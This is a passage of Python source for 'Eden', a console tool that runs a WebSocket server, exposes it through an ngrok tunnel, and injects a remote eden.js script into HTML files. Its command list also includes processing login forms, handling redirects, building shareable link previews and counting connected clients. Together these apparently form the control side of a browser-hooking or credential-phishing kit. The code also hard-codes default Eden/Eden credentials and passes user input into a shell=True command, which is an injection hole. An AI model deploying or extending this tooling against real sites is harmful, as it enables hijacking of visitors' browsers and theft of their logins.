            print(f"\n{Fore.YELLOW}{cmd}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Description:{Style.RESET_ALL} {info['description']}")
            print(f"  {Fore.GREEN}Syntax:{Style.RESET_ALL} {info['syntax']}")
            print(f"  {Fore.GREEN}Example:{Style.RESET_ALL} {info['examples'][0]}")
        
        print(f"\n{Fore.CYAN}For detailed help on a specific command, use: {Fore.WHITE}syntax <command>{Style.RESET_ALL}")

# Function to show help
def show_help():
    """Show help information about available commands"""
    print(f"\n{Fore.CYAN}Available commands:")
    
    commands = [
        ("help", "Show this help message"),
        ("clear", "Clear the screen and show the banner"),
        ("server", "Open the server control panel in your browser"),
        ("restart", "Restart the server"),
        ("output <path>", "Set custom location for the EDEN_OUTPUT folder"),
        ("loaddir <path>", "Set custom location to monitor for downloads"),
        ("link <file>", "Add eden.js script to an HTML file"),
        ("redirect <file>", "Process redirect elements in HTML files"),
        ("login <file>", "Process login forms in HTML files"),
        ("master <file>", "Apply all optimizations to HTML files"),
        ("template <file>", "Process HTML templates with embedded resources"),
        ("syntax [command]", "Show syntax for a specific command"),
        ("exit", "Exit the program")
    ]
    
    max_len = max(len(cmd[0]) for cmd in commands)
    for cmd, desc in commands:
        print(f"  {Fore.GREEN}{cmd.ljust(max_len)}{Fore.WHITE} - {desc}")

# Additional help for the new commands
def show_syntax(command=None):
    """Show syntax information for a specific command"""
    if command == "output":
        print(f"\n{Fore.CYAN}output <path>")
        print(f"{Fore.WHITE}  Set a custom location for the EDEN_OUTPUT folder")
        print(f"{Fore.WHITE}  Example: {Fore.GREEN}output /home/user/eden_files")
        print(f"{Fore.WHITE}  Example: {Fore.GREEN}output D:\\eden_files")
        print(f"{Fore.WHITE}  Supports absolute paths, relative paths, and paths with ~ for home directory")
        return
    elif command == "loaddir":
        print(f"\n{Fore.CYAN}loaddir <path>")
        print(f"{Fore.WHITE}  Set a custom location to monitor for eden files")
        print(f"{Fore.WHITE}  Example: {Fore.GREEN}loaddir /home/user/Downloads")
        print(f"{Fore.WHITE}  Example: {Fore.GREEN}loaddir C:\\Users\\Username\\Desktop")
        print(f"{Fore.WHITE}  Supports absolute paths, relative paths, and paths with ~ for home directory")
        return
    elif command:
        # Show syntax for other commands
        # [existing syntax handling for other commands]
        pass
    else:
        # Show general syntax help
        print(f"\n{Fore.CYAN}Available commands with detailed syntax:")
        print(f"{Fore.WHITE}  Use {Fore.GREEN}syntax <command>{Fore.WHITE} to see detailed help for a specific command")
        print(f"{Fore.WHITE}  Example: {Fore.GREEN}syntax output")
        print(f"{Fore.WHITE}  Example: {Fore.GREEN}syntax loaddir")

# Function to find process by port
def find_process_by_port(port):
    # Windows
    if os.name == 'nt':
        try:
            output = subprocess.check_output(f"netstat -ano | findstr :{port}", shell=True).decode()
            if output:
                lines = output.strip().split('\n')
                for line in lines:
                    if "LISTENING" in line:
                        pid = line.strip().split()[-1]
                        return pid
        except subprocess.CalledProcessError:
            pass
    # Linux/Mac
    else:
        try:
            output = subprocess.check_output(f"lsof -i :{port} | grep LISTEN", shell=True).decode()
            if output:
                pid = output.strip().split()[1]
                return pid
        except subprocess.CalledProcessError:
            pass
            
    return None

# Function to kill process
def kill_process(pid):
    try:
        if os.name == 'nt':
            # Redirect output to NUL to hide the SUCCESS message
            subprocess.call(f"taskkill /PID {pid} /F > NUL 2>&1", shell=True)
        else:
            # On Unix systems, redirect to /dev/null
            subprocess.call(f"kill -9 {pid} > /dev/null 2>&1", shell=True)
        return True
    except:
        return False

# Function to safely shutdown the server
def shutdown_server(silent=False):
    """Shutdown the Node.js server if it's running"""
    global server_status
    
    # Stop eden output monitor
    stop_eden_output_monitor()
    
    # Find server process
    server_pid = find_process_by_port(8080)
    if server_pid:
        # Kill the process
        if kill_process(server_pid):
            if not silent:
                print(f"{Fore.GREEN}✓ Server stopped.")
            server_status = "Stopped"
        else:
            if not silent:
                print(f"{Fore.RED}✗ Failed to stop server.")
    elif not silent:
        print(f"{Fore.YELLOW}⚠ No server running on port 8080.")

# Function to monitor node.js output for connections
def monitor_node_output(log_file):
    global connected_count
    
    try:
        with open(log_file, 'r') as f:
            # Move to the end of file
            f.seek(0, 2)
            
            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                
                line = line.strip()
                
                # Look for connection indications
                if "client connected" in line.lower() or "new client connected" in line.lower():
                    # Increment connected count (max 2)
                    connected_count = min(connected_count + 1, 2)
                    
                    # Update the display
                    print_banner()
                    print(f"{Fore.BLUE}eden& {Fore.WHITE}", end='', flush=True)
                
                # Look for disconnection indications
                elif "client disconnected" in line.lower():
                    # Decrement connected count (min 0)
                    connected_count = max(connected_count - 1, 0)
                    
                    # Update the display
                    print_banner()
                    print(f"{Fore.BLUE}eden& {Fore.WHITE}", end='', flush=True)
    except Exception as e:
        print(f"Error monitoring log: {e}")

# Function to replace WebSocket URLs in eden.js and server.html
def update_websocket_urls(ngrok_url=None, is_local=False):
    # Define exact files with their WebSocket URL patterns
    eden_file = os.path.join(os.getcwd(), "eden.js")
    server_file = os.path.join(os.getcwd(), "server.html")
    
    # Check if files exist
    eden_exists = os.path.exists(eden_file)
    server_exists = os.path.exists(server_file)
    
    if not eden_exists and not server_exists:
        print(f"{Fore.RED}✗ Neither eden.js nor server.html found in current directory")
        return False
    
    success = True
    
    # Replace in eden.js
    if eden_exists:
        try:
            print(f"{Fore.CYAN}▶ Updating WebSocket URL in eden.js...")
            with open(eden_file, 'r', encoding='utf-8') as file:
                content = file.read()
            
            # Look for the WebSocket URL pattern in eden.js
            # This should match: const wsUrl = 'wss://...';
            ws_pattern = r"const\s+wsUrl\s*=\s*'(wss?://[^']+)';"
            
            if is_local:
                # Replace with local WebSocket URL
                new_content = re.sub(ws_pattern, "const wsUrl = 'ws://localhost:8080';", content, count=1)
            else:
                # Replace with ngrok WebSocket URL
                new_content = re.sub(ws_pattern, f"const wsUrl = 'wss://{ngrok_url}';", content, count=1)
            
            # Also update the URL in EDEN_LINK_PREVIEW if it exists
            if "EDEN_LINK_PREVIEW" in new_content:
                print(f"{Fore.CYAN}▶ Updating link preview URL in eden.js...")
                
                # Extract the current EDEN_LINK_PREVIEW object
                preview_pattern = r"const EDEN_LINK_PREVIEW = \{([^}]*)\};"
                preview_match = re.search(preview_pattern, new_content)
                
                if preview_match:
                    preview_content = preview_match.group(1)
                    
                    # Check if link preview is enabled
                    if "enabled: true" in preview_content:
                        # Update the URL based on server mode
                        if is_local:
                            base_url = "http://localhost:8080"
                        else:
                            base_url = f"https://{ngrok_url}"
                        
                        # Update the image URL if it's a relative path
                        image_pattern = r'image: "(/[^"]*)"'
                        image_match = re.search(image_pattern, preview_content)
                        
                        if image_match:
                            relative_path = image_match.group(1)
                            full_image_url = f"{base_url}{relative_path}"
                            
                            # Replace the image URL with the full URL
                            preview_content = re.sub(image_pattern, f'image: "{full_image_url}"', preview_content)
                        
                        # Update the URL field
                        url_pattern = r'url: "[^"]*"'
                        preview_content = re.sub(url_pattern, f'url: "{base_url}"', preview_content)
                        
                        # Replace the entire EDEN_LINK_PREVIEW object
                        new_content = re.sub(preview_pattern, f"const EDEN_LINK_PREVIEW = {{{preview_content}}};", new_content)
                        
                        print(f"{Fore.GREEN}✓ Updated link preview URLs to {base_url}")
            
            # Write the modified content back
            with open(eden_file, 'w', encoding='utf-8') as file:
                file.write(new_content)
                
            print(f"{Fore.GREEN}✓ Updated WebSocket URL in eden.js")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to update eden.js: {e}")
            success = False
    
    # Replace in server.html
    if server_exists:
        try:
            print(f"{Fore.CYAN}▶ Updating WebSocket and CSS URLs in server.html...")
            
            with open(server_file, 'r', encoding='utf-8') as file:
                content = file.read()

            # Pattern for WebSocket URL
            ws_pattern = r"ws\s*=\s*new\s+WebSocket\(\s*'(wss?://[^']+)'\s*\);"
            
            # Pattern for CSS link href
            css_pattern = r'<link\s+rel="stylesheet"\s+href="https?://[^"]+/server\.css">'

            # Replace both WebSocket and CSS URLs
            if is_local:
                content = re.sub(ws_pattern, "ws = new WebSocket('ws://localhost:8080');", content, count=1)
                content = re.sub(css_pattern, '<link rel="stylesheet" href="http://localhost:8080/server.css">', content, count=1)
            else:
                content = re.sub(ws_pattern, f"ws = new WebSocket('wss://{ngrok_url}');", content, count=1)
                content = re.sub(css_pattern, f'<link rel="stylesheet" href="https://{ngrok_url}/server.css">', content, count=1)

            # Write updated content
            with open(server_file, 'w', encoding='utf-8') as file:
                file.write(content)

            print(f"{Fore.GREEN}✓ Updated WebSocket and CSS URLs in server.html")

        except Exception as e:
            print(f"{Fore.RED}✗ Failed to update server.html: {e}")
            success = False

    try:
        print(f"{Fore.CYAN}▶ Updating CSS URL in login.html...")

        with open('login.html', 'r', encoding='utf-8') as file:
            login_content = file.read()

        css_pattern = r'<link\s+rel="stylesheet"\s+href="https?://[^"]+/server\.css">'

        if is_local:
            login_content = re.sub(css_pattern, '<link rel="stylesheet" href="http://localhost:8080/server.css">', login_content, count=1)
        else:
            login_content = re.sub(css_pattern, f'<link rel="stylesheet" href="https://{ngrok_url}/server.css">', login_content, count=1)

        with open('login.html', 'w', encoding='utf-8') as file:
            file.write(login_content)

        print(f"{Fore.GREEN}✓ CSS URL successfully updated in login.html")

    except Exception as e:
        print(f"{Fore.RED}✗ Failed to update login.html: {e}")
        success = False
    
    # Update link_preview.json if it exists
    link_preview_file = os.path.join(os.getcwd(), "link_preview.json")
    if os.path.exists(link_preview_file):
        try:
            print(f"{Fore.CYAN}▶ Updating URL in link preview configuration...")
            import json
            
            with open(link_preview_file, 'r') as f:
                preview_config = json.load(f)
            
            if preview_config.get("enabled", False):
                # Update the base URL in the configuration
                if is_local:
                    preview_config["base_url"] = "http://localhost:8080"
                else:
                    preview_config["base_url"] = f"https://{ngrok_url}"
                
                with open(link_preview_file, 'w') as f:
                    json.dump(preview_config, f, indent=2)
                
                print(f"{Fore.GREEN}✓ Updated URL in link preview configuration")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to update link preview configuration: {e}")
            # Don't set success to False as this is optional
    
    return success

# Function to run ngrok
def run_ngrok():
    global ngrok_url
    
    # Check if ngrok exists
    try:
        output = subprocess.check_output("ngrok --version", shell=True).decode()
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{Fore.RED}✗ ngrok is not installed or not in PATH")
        print(f"{Fore.YELLOW}Please install ngrok from https://ngrok.com/download")
        return None
    
    # Check if ngrok auth token is set
    token_configured = False
    try:
        output = subprocess.check_output("ngrok config check", shell=True, stderr=subprocess.STDOUT).decode()
        # If we get here without exception and don't see an error about authtoken, assume it's configured
        if "authtoken is not set" not in output.lower() and "error" not in output.lower():
            token_configured = True
    except subprocess.CalledProcessError as e:
        output = e.output.decode() if hasattr(e, 'output') else ""
        # Check if the error is about the authtoken
        if "authtoken is not set" in output.lower():
            token_configured = False
        else:
            print(f"{Fore.RED}✗ Error checking ngrok configuration: {output}")
    
    # If token is not configured, ask for it
    if not token_configured:
        print(f"{Fore.BLUE}➤ ngrok authtoken is not set or not properly configured")
        print(f"{Fore.YELLOW}An authtoken is required to use ngrok. Get yours at https://dashboard.ngrok.com/get-started/your-authtoken")
        
        # Keep asking until a token is provided or user cancels
        while True:
            token_input = input(f"{Fore.BLUE}➤ Enter your ngrok authtoken or full command (e.g. 'ngrok config add-authtoken TOKEN'), or 'exit' to cancel: {Fore.WHITE}")
            
            if token_input.lower() == 'exit':
                print(f"{Fore.RED}✗ ngrok setup cancelled")
                return None
            elif not token_input:
                print(f"{Fore.RED}✗ No token provided. A valid authtoken is required.")
                continue
            else:
                # Extract token from input
                token = token_input
                
                # If it's the full command, extract just the token part
                if token_input.lower().startswith("ngrok config add-authtoken"):
                    try:
                        token = token_input.split("ngrok config add-authtoken")[1].strip()
                    except:
                        print(f"{Fore.RED}✗ Invalid command format. Please enter just the token or the full command.")
                        continue
                
                # Try to configure the token
                try:
                    result = subprocess.run(f"ngrok config add-authtoken {token}", shell=True, 
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    if result.returncode == 0:
                        print(f"{Fore.GREEN}✓ ngrok authtoken configured successfully")
                        token_configured = True
                        break
                    else:
                        print(f"{Fore.RED}✗ Failed to configure authtoken: {result.stderr}")
                except Exception as e:
                    print(f"{Fore.RED}✗ Error configuring authtoken: {e}")
    
    # Don't proceed if token is still not configured
    if not token_configured:
        print(f"{Fore.RED}✗ Cannot proceed without a valid ngrok authtoken")
        return None
    
    # Kill any existing ngrok process
    if os.name == 'nt':
        try:
            subprocess.call("taskkill /f /im ngrok.exe > NUL 2>&1", shell=True)
        except:
            pass
    else:
        try:
            subprocess.call("killall ngrok > /dev/null 2>&1", shell=True)
        except:
            pass
    
    # Start ngrok
    print(f"{Fore.CYAN}▶ Starting ngrok tunnel for port 8080...")
    # Run ngrok in background
    ngrok_process = subprocess.Popen(
        "ngrok http 8080", 
        shell=True, 
        stdout=subprocess.PIPE if os.name == 'nt' else subprocess.DEVNULL,
        stderr=subprocess.PIPE if os.name == 'nt' else subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
    )
    
    # Wait for ngrok to start
    print(f"{Fore.CYAN}▶ Waiting for ngrok tunnel to establish...")
    time.sleep(3)
    
    # Get ngrok URL
    try:
        # Try to get the tunnel URL using the ngrok API
        api_url = "http://127.0.0.1:4040/api/tunnels"
        curl_cmd = f"curl -s {api_url}"
        
        if os.name == 'nt':
            curl_output = subprocess.check_output(curl_cmd, shell=True).decode()
        else:
            curl_output = subprocess.check_output(["curl", "-s", api_url]).decode()
        
        tunnels = json.loads(curl_output)["tunnels"]
        for tunnel in tunnels:
            if tunnel["proto"] == "https":
                ngrok_url = tunnel["public_url"].replace("https://", "")
                print(f"{Fore.GREEN}✓ ngrok tunnel established: {ngrok_url}")
                return ngrok_url
            
        # If no HTTPS tunnel found
        print(f"{Fore.RED}✗ No HTTPS tunnel found in ngrok response")
        return None
    except Exception as e:
        print(f"{Fore.RED}✗ Error getting ngrok URL: {e}")
    
    print(f"{Fore.RED}✗ Failed to get ngrok URL automatically")
    manual_url = input(f"{Fore.BLUE}➤ Enter the ngrok URL manually (e.g., abc-123.ngrok-free.app): {Fore.WHITE}")
    if manual_url:
        ngrok_url = manual_url
        return manual_url
    else:
        print(f"{Fore.RED}✗ No ngrok URL provided")
        return None

# Function to handle authentication configuration
def handle_auth_config():
    """Reset to Eden/Eden and allow user to view/change credentials"""
    import json
    auth_config_path = os.path.join(os.getcwd(), "auth_config.json")

    # Step 1: Default config
    default_config = {
        "username": "Eden",
        "password": "Eden"
    }

    # Step 2: Write default config before anything
    try:
        with open(auth_config_path, 'w') as f:
            json.dump(default_config, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}✗ Failed to reset auth_config.json: {e}")
        return False

    # Step 3: Read and display defaults
    try:
        with open(auth_config_path, 'r') as f:
            auth_config = json.load(f)

        current_username = auth_config.get("username", "varun")
        current_password = auth_config.get("password", "varun")

        print(f"\n{Fore.CYAN}Current Authentication Credentials:")
        print(f"{Fore.WHITE}Username: {Fore.YELLOW}{current_username}")
        print(f"{Fore.WHITE}Password: {Fore.YELLOW}{current_password}")

        # Step 4: Ask user if they want to change
        change_creds = input(f"\n{Fore.BLUE}➤ Do you want to change credentials? (y/n): {Fore.WHITE}").lower()

        if change_creds == 'y':
            new_username = input(f"{Fore.BLUE}➤ Enter new username: {Fore.WHITE}")
            new_password = input(f"{Fore.BLUE}➤ Enter new password: {Fore.WHITE}")

            auth_config["username"] = new_username
            auth_config["password"] = new_password

            with open(auth_config_path, 'w') as f:
                json.dump(auth_config, f, indent=2)

            print(f"{Fore.GREEN}✓ Authentication credentials updated successfully")
        else:
            print(f"{Fore.GREEN}✓ Default credentials used")

        return True

    except Exception as e:
        print(f"{Fore.RED}✗ Error handling authentication configuration: {e}")
        return False

def update_template_links(silent=False):
    """
    Update all standalone template files with the current server URLs.
    
    Args:
        silent (bool): If True, don't print status messages
    """
    global server_mode, ngrok_url
    
    # Create templates directory if it doesn't exist
    templates_dir = os.path.join(os.getcwd(), "templates")
    os.makedirs(templates_dir, exist_ok=True)
    
    # Determine base URL based on server mode
    if server_mode == "Ngrok" and ngrok_url:
        base_url = f"https://{ngrok_url}"
        ws_url = f"wss://{ngrok_url}"
    else:
        base_url = "http://localhost:8080"
        ws_url = "ws://localhost:8080"
    
    # Find all HTML files in the templates directory
    template_files = []
    try:
        for file in os.listdir(templates_dir):
            if file.lower().endswith('_eden.html') or file.lower().endswith('.html'):
                template_files.append(os.path.join(templates_dir, file))
    except Exception as e:
        if not silent:
            print(f"{Fore.YELLOW}⚠ Error scanning templates directory: {e}")
        return
    
    if not template_files:
        if not silent:
            print(f"{Fore.YELLOW}⚠ No template files found in {templates_dir}")
        return
    
    # Process each template file
    updated_count = 0
    for template_file in template_files:
        try:
            with open(template_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update WebSocket URLs
            ws_pattern = r'(wss?://[^/]+)'
            content = re.sub(ws_pattern, ws_url, content)
            
            # Update HTTP/HTTPS URLs
            http_pattern = r'(https?://[^/]+)'
            content = re.sub(http_pattern, base_url, content)
            
            # Update resource URLs that might be relative
            resource_pattern = r'(src|href)="(/templates/resource/[^"]+)"'
            content = re.sub(resource_pattern, f'\\1="{base_url}\\2"', content)
            
            # Write the updated content back
            with open(template_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            updated_count += 1
            
        except Exception as e:
            if not silent:
                print(f"{Fore.YELLOW}⚠ Error updating {os.path.basename(template_file)}: {e}")
    
    if not silent and updated_count > 0:
        print(f"{Fore.GREEN}✓ Updated {updated_count} template files with {base_url} URLs")

# Function to start Node.js server
def start_node_server():
    """Start the Node.js server"""
    global server_status, server_mode, ngrok_url
    
    # Check if server.js exists
    server_file = os.path.join(os.getcwd(), "server.js")
    if not os.path.isfile(server_file):
        print("✗ server.js not found")
        return False
    
    # Install npm packages silently
    install_express_ws()
    
    # Check if ngrok is installed for Ngrok mode
    if server_mode == "Ngrok" and not is_installed("ngrok"):
        install_ngrok()
        
        # If ngrok installation failed, fall back to Local mode
        if not is_installed("ngrok"):
            server_mode = "Local"
    
    # Start the server
    try:
        # Create log file for server output
        log_file = os.path.join(os.getcwd(), "server_log.txt")
        log_fd = open(log_file, "w")
        
        # Start the server process
        if server_mode == "Local":
            print("▶ Starting server...")
            server_process = subprocess.Popen(
                ["node", server_file],
                stdout=log_fd,
                stderr=log_fd
            )
            
            # Wait a moment for server to start
            time.sleep(2)
            
            # Update server status
            server_status = "Running"
            print("✓ Server started at http://localhost:8080")
            
            # Start monitoring server output
            monitor_thread = threading.Thread(target=monitor_node_output, args=(log_file,))
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Update template links for local mode
            update_template_links(silent=True)
            
            return True
            
        elif server_mode == "Ngrok":
            print("▶ Starting server with ngrok...")
            server_process = subprocess.Popen(
                ["node", server_file],
                stdout=log_fd,
                stderr=log_fd
            )
            
            # Wait a moment for server to start
            time.sleep(2)
            
            # Start ngrok in a separate thread
            ngrok_thread = threading.Thread(target=run_ngrok)
            ngrok_thread.daemon = True
            ngrok_thread.start()
            
            # Wait for ngrok to provide a URL (timeout after 30 seconds)
            timeout = 30
            start_time = time.time()
            while ngrok_url is None and time.time() - start_time < timeout:
                time.sleep(1)
                
            if ngrok_url:
                # Update server status
                server_status = "Running"
                print(f"✓ Server started at https://{ngrok_url}")
                
                # Start monitoring server output
                monitor_thread = threading.Thread(target=monitor_node_output, args=(log_file,))
                monitor_thread.daemon = True
                monitor_thread.start()
                
                # Update template links for ngrok mode
                update_template_links(silent=True)
                
                return True
            else:
                # ngrok failed to start
                server_mode = "Local"
                server_status = "Running"
                
                # Update template links for local mode
                update_template_links(silent=True)
                
                return True
    except Exception:
        print("✗ Error starting server")
        return False

# Function to add eden.js script to an HTML file
def link_script_to_html(filename):
    # Check if filename is provided
    if not filename:
        print(f"{Fore.RED}Error: No filename provided.")
        print(f"{Fore.YELLOW}Usage: link <filename>")
        return False
    
    # Handle file path
    file_path = Path(filename)
    
    # Check if file exists
    if not file_path.exists():
        print(f"{Fore.RED}Error: File '{filename}' not found.")
        return False
    
    try:
        # Read the file
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
        
        # Check if it's an HTML file by looking for HTML tags
        if '<html' not in content.lower():
            print(f"{Fore.RED}Error: '{filename}' does not appear to be an HTML file.")
            return False
        
        # Determine the correct script tag based on server mode
        global server_mode, ngrok_url
        if server_mode == "Ngrok" and ngrok_url:
            script_tag = f'<script src="https://{ngrok_url}/eden.js"></script>'
        else:
            script_tag = '<script src="http://localhost:8080/eden.js"></script>'
            
        # Check if any version of the script tag is already present
        if 'eden.js"></script>' in content:
            print(f"{Fore.YELLOW}The script tag is already present in '{filename}'.")
            return True
        
        # Find the closing body tag
        body_closing_pos = content.lower().rfind('</body>')
        
        # Check if we need to remove existing eden.js script tags
        eden_pattern = r'<script\s+src=["\'](https?:\/\/[^"\']+\/eden\.js)["\']><\/script>'
        content = re.sub(eden_pattern, '', content)
        
        if body_closing_pos == -1:
            print(f"{Fore.YELLOW}Warning: No closing </body> tag found in '{filename}'.")
            print(f"{Fore.YELLOW}Adding script tag at the end of the file.")
            new_content = content + f"\n{script_tag}\n"
        else:
            # Insert the script tag before the closing body tag
            new_content = content[:body_closing_pos] + f"\n{script_tag}\n" + content[body_closing_pos:]
        
        # Write the modified content back to the file
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(new_content)
        
        print(f"{Fore.GREEN}✓ Successfully added eden.js script to '{filename}'.")
        return True
    
    except Exception as e:
        print(f"{Fore.RED}Error adding script to '{filename}': {e}")
        return False

# Function to open the server control panel in the browser
def open_server_panel():
    global server_mode, ngrok_url
    try:
        # Use different URL based on server mode
        if server_mode == "Ngrok" and ngrok_url:
            url = f"https://{ngrok_url}/server.html"
            print(f"{Fore.MAGENTA}Opening server control panel in browser: {url}")
        else:
            url = "http://localhost:8080/server.html"
            print(f"{Fore.CYAN}Opening server control panel in browser: {url}")
            
        webbrowser.open(url)
        return True
    except Exception as e:
        print(f"{Fore.RED}Error opening browser: {e}")
        return False

# Function to handle link preview configuration
def handle_link_preview():
    """Configure link preview settings for social media sharing"""
    import shutil
    import re
    
    print(f"\n{Fore.CYAN}Link Preview Configuration:")
    print(f"{Fore.WHITE}This will add Open Graph and Twitter Card meta tags for rich previews when sharing links.")
    
    # Ask if user wants to enable link previews
    enable_preview = input(f"\n{Fore.BLUE}➤ Do you want to enable link previews? (y/n): {Fore.WHITE}").lower()
    
    # Check if eden.js exists
    eden_js_path = os.path.join(os.getcwd(), "eden.js")
    if not os.path.exists(eden_js_path):
        print(f"{Fore.RED}✗ eden.js not found")
        return False
    
    try:
        # Read the current content
        with open(eden_js_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Check if EDEN_LINK_PREVIEW exists
        if "EDEN_LINK_PREVIEW" not in content:
            print(f"{Fore.RED}✗ Link preview configuration not found in eden.js")
            return False
        
        if enable_preview != 'y':
            print(f"{Fore.GREEN}✓ Link previews will not be enabled")
            
            # Update the EDEN_LINK_PREVIEW object to disable it
            updated_content = re.sub(
                r"const EDEN_LINK_PREVIEW = \{[^}]*enabled: (?:true|false)[^}]*\};",
                "const EDEN_LINK_PREVIEW = {\n    enabled: false,\n    title: \"Eden\",\n    description: \"Eden Dynamic Execution Network\",\n    image: \"\",\n    url: \"\",\n    twitter_card: \"summary_large_image\"\n};",
                content
            )
            
            # Write the updated content back
            with open(eden_js_path, 'w', encoding='utf-8') as f:
                f.write(updated_content)
            
            return True
        
        # Create thumbnails directory if it doesn't exist
        thumbnails_dir = os.path.join(os.getcwd(), "thumbnails")
        os.makedirs(thumbnails_dir, exist_ok=True)
        
        # Get link preview details
        print(f"\n{Fore.CYAN}Please provide the following details for link previews:")
        
        title = input(f"{Fore.BLUE}➤ Title for preview: {Fore.WHITE}")
        description = input(f"{Fore.BLUE}➤ Description for preview: {Fore.WHITE}")
        
        # Handle image
        image_path = input(f"{Fore.BLUE}➤ Path to thumbnail image or URL (leave empty for default): {Fore.WHITE}")
        
        # Default image name and path in thumbnails directory
        image_filename = "thumbnail.jpg"
        target_image_path = os.path.join(thumbnails_dir, image_filename)
        image_url = ""
        
        # Check if image_path is a URL
        if image_path.startswith(("http://", "https://")):
            # It's a URL, use it directly
            image_url = image_path
            print(f"{Fore.GREEN}✓ Using image URL: {image_url}")
        elif image_path and os.path.exists(image_path):
            try:
                # It's a local file, copy it to thumbnails directory
                shutil.copy2(image_path, target_image_path)
                print(f"{Fore.GREEN}✓ Image copied to thumbnails directory")
                
                # For local server
                image_url = f"/thumbnails/{image_filename}"
            except Exception as e:
                print(f"{Fore.RED}✗ Error copying image: {e}")
                image_url = f"/thumbnails/{image_filename}"
        else:
            print(f"{Fore.YELLOW}⚠ No valid image provided, will use placeholder reference")
            image_url = f"/thumbnails/{image_filename}"
        
        # Prepare values for replacement
        title = title or "Eden - Dynamic Execution Network"
        description = description or "Secure browser-based dynamic execution environment"
        
        # Update the EDEN_LINK_PREVIEW object
        updated_content = re.sub(
            r"const EDEN_LINK_PREVIEW = \{[^}]*\};",
            f'''const EDEN_LINK_PREVIEW = {{
    enabled: true,
    title: "{title}",
    description: "{description}",
    image: "{image_url}",
    url: "",
    twitter_card: "summary_large_image"
}};''',
            content
        )
        
        # Write the updated content back
        with open(eden_js_path, 'w', encoding='utf-8') as f:
            f.write(updated_content)
        
        print(f"{Fore.GREEN}✓ Link preview configuration updated in eden.js")
        return True
    except Exception as e:
        print(f"{Fore.RED}✗ Error updating link preview configuration: {e}")
        return False



# Main function to set up the server
def setup_server():
    global server_mode, server_status, ngrok_url
    
    print_banner()
    
    # Handle authentication configuration
    if not handle_auth_config():
        print(f"{Fore.RED}✗ Failed to configure authentication")
        return False
    
    # Handle link preview configuration
    #if not handle_link_preview():
     #   print(f"{Fore.RED}✗ Failed to configure link previews")
        # Continue anyway as this is not critical
    
    # Ask for server mode
    print(f"\n{Fore.YELLOW}Select connection type:")
    print(f"{Fore.WHITE}1) {Fore.CYAN}Local Network {Fore.WHITE}(ws://localhost:8080)")
    print(f"{Fore.WHITE}2) {Fore.MAGENTA}Port Forwarding {Fore.WHITE}(ngrok - wss://your-domain.ngrok-free.app)")
    
    choice = input(f"\n{Fore.BLUE}➤ Enter your choice (1/2): {Fore.WHITE}")
    
    # Set mode based on choice
    if choice == '1':
        server_mode = "Local"
        print(f"{Fore.GREEN}✓ Server mode set to Local")
    else:
        server_mode = "Ngrok"
        print(f"{Fore.GREEN}✓ Server mode set to Ngrok")
        
        # Check if ngrok is installed when user selects Ngrok mode
        if not is_installed("ngrok"):
            print(f"{Fore.YELLOW}⚠ ngrok is not installed. Installing ngrok...")
            install_ngrok()
            
            # Check if installation succeeded
            if not is_installed("ngrok"):
                print(f"{Fore.RED}✗ ngrok installation failed.")
                print(f"{Fore.YELLOW}Would you like to switch to Local mode instead?")
                local_choice = input(f"{Fore.BLUE}➤ Switch to Local mode? (y/n): {Fore.WHITE}")
                if local_choice.lower() == 'y':
                    server_mode = "Local"
                    print(f"{Fore.GREEN}✓ Server mode switched to Local")
                else:
                    print(f"{Fore.RED}✗ Cannot continue without ngrok. Please install manually.")
                    return False
    
    # Start the Node.js server
    if start_node_server():
        # Update URLs based on mode
        if server_mode == "Local":
            print(f"\n{Fore.CYAN}▶ Setting up for local network...")
            update_websocket_urls(is_local=True)
        else:
            print(f"\n{Fore.CYAN}▶ Setting up ngrok tunnel...")
            ngrok_url = run_ngrok()
            
            if ngrok_url:
                update_websocket_urls(ngrok_url=ngrok_url)
                print(f"{Fore.GREEN}✓ WebSocket URLs updated successfully")
            else:
                # ngrok setup failed, ask if user wants to switch to local mode
                print(f"{Fore.RED}✗ ngrok setup failed.")
                local_choice = input(f"{Fore.BLUE}➤ Would you like to switch to Local mode instead? (y/n): {Fore.WHITE}")
                if local_choice.lower() == 'y':
                    server_mode = "Local"
                    print(f"{Fore.GREEN}✓ Server mode switched to Local")
                    update_websocket_urls(is_local=True)
                    print(f"{Fore.GREEN}✓ WebSocket URLs updated for local mode")
                else:
                    print(f"{Fore.RED}✗ Server setup incomplete. WebSocket connections may not work properly.")
        
        # Update template links silently after server mode has been set
        update_template_links(silent=False)
        
        # Show final banner with details
        print_banner()
    
    # Enter command mode
    main_menu()

# Main menu function
def main_menu():
    while True:
        try:
            command = input(f"\n{Fore.BLUE}eden& {Fore.WHITE}").strip().lower()
            
            if command == "clear":
                print_banner()
            elif command == "help":
                show_help()
            elif command == "restart":
                print(f"{Fore.CYAN}Restarting setup...\n")
                pid = find_process_by_port(8080)
                if pid:
                    if kill_process(pid):
                        print(f"{Fore.GREEN}✓ Server stopped.")
                    else:
                        print(f"{Fore.RED}Failed to stop server.")
                setup_server()
            elif command.startswith("output "):
                # Set custom output directory for EDEN_OUTPUT folder
                path = command[7:].strip()
                set_output_dir(path)
            elif command.startswith("loaddir "):
                # Set custom directory to monitor for downloads
                path = command[8:].strip()
                set_download_dir(path)
                
                # Restart the monitor thread with new path
                stop_eden_output_monitor()
                start_eden_output_monitor()
            elif command.startswith("link "):
                filename = command[5:].strip()
                link_script_to_html(filename)
            elif command == "server":
                open_server_panel()
            elif command.startswith("redirect "):
                # Extract the file patterns from the command
                file_patterns = command[9:].strip().split()
                if not file_patterns:
                    print(f"{Fore.RED}Error: No file patterns provided.")
                    print(f"{Fore.YELLOW}Usage: redirect <file_pattern> [<file_pattern> ...]")
                else:
                    # Create an instance of the HtmlModifier class and process the files
                    modifier = HtmlModifier()
                    if modifier.process_files(file_patterns):
                        # Display the found redirect elements
                        modifier.display_redirect_elements()
                        
